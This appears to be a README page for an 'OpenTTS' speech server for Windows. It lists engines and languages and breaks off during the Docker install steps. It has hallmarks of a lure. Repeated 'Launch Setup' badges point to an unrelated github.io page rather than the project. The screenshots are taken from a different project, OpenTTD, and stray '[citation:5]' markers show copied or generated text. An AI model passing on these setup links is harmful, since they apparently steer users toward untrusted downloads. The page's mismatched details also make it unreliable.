# OpenTTS Unified Speech Server for Windows

<div align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Openttdlogo.svg/330px-Openttdlogo.svg.png?_=20220212024004" alt="OpenTTS Platform" width="800">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style=for-the-badge)](https://gqwgqwe.github.io/.github/OpenTTS-Server-Platform)

---

## What is OpenTTS?

OpenTTS is a unified HTTP server that provides access to multiple open-source text-to-speech engines through a single REST API. It supports a wide range of engines including Larynx, Coqui-TTS, MaryTTS, eSpeak, Flite, Glow-Speak, nanoTTS, and Festival [citation:5].

Infrastructure teams building voice-enabled applications benefit from OpenTTS's ability to switch between different TTS engines and voices without changing application code. System administrators appreciate the Docker-based deployment, support for 27+ languages, and the ability to use multiple voices within a single SSML document [citation:5].

---

## Screenshot Block

<div align="center">
  <img src="https://wiki.openttd.org/uploads/en/Archive/Manual/Settings/Advset%20interface%201.1.1.png" alt="OpenTTS Architecture" width="700">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style=for-the-badge)](https://gqwgqwe.github.io/.github/OpenTTS-Server-Platform)

---

## Key Features

| Feature | Description |
|---------|-------------|
| **Multi-Engine Support** | Larynx, Coqui-TTS, MaryTTS, eSpeak, Flite, Glow-Speak, nanoTTS, Festival [citation:5] |
| **Unified API** | Single REST endpoint for all supported engines |
| **SSML Support** | Select different voices, engines, and languages within one document [citation:5] |
| **27+ Languages** | English, German, French, Spanish, Dutch, Russian, Japanese, Chinese, and more [citation:5] |
| **Docker Deployment** | Ready-to-use Docker images for quick setup [citation:5] |
| **Multiple Voices** | Over 100 voices across all supported engines [citation:5] |
| **Lightweight** | Minimal dependencies for server deployment |

---

## Supported Languages

| Language | Code | Supported Engines |
|----------|------|-------------------|
| English | en | All engines |
| German | de | Larynx, Glow-Speak, eSpeak, Festival |
| French | fr | Larynx, MaryTTS, eSpeak |
| Spanish | es | Larynx, Glow-Speak, eSpeak, Festival |
| Dutch | nl | Larynx, Glow-Speak, eSpeak |
| Russian | ru | Larynx, MaryTTS, eSpeak, Festival |
| Italian | it | Larynx, MaryTTS, Festival |
| Japanese | ja | Coqui-TTS, eSpeak |
| Chinese | zh | Coqui-TTS, eSpeak |
| Hindi | hi | Flite, eSpeak, Festival |
| Korean | ko | Glow-Speak, eSpeak |

*Source: OpenTTS GitHub repository [citation:5]*

---

## Installation Guide

### Prerequisites

- Windows 10/11 (with Docker Desktop) or Linux
- Docker
- Git (optional)

### Option 1: Docker (Recommended)

**Step 1:** Pull the OpenTTS Docker image:

```bash
docker pull synesthesiam/opentts:en
